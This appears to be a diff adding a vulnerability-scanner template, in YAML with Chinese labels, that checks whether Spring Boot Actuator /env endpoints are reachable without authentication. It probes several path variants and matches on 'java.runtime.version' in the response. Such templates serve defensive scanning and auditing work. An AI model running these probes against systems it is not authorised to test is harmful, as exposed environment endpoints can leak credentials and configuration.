@@ -1,0 +1,30 @@
+id: poc-yaml-spring-boot-actuator-unauthorized-access
+info:
+  name: Spring Boot Actuator 未授权访问漏洞
+  severity: high
+  tags:
+  - 配置不当
+  finger: Spring
+  osprey-id: vb_2018_0038
+variables:
+  r_path: 'env
+
+    actuator/env
+
+    api/env
+
+    api/actuator/env
+
+    apis/actuator/env'
+requests:
+- method: GET
+  path: /{{.r_path}}
+  headers: {}
+  expression: 'status_code == 200 && contains(body, "java.runtime.version")
+
+    && contains(body, "{")
+
+    && !contains(body, "<html")
+
+    '
+transport: http
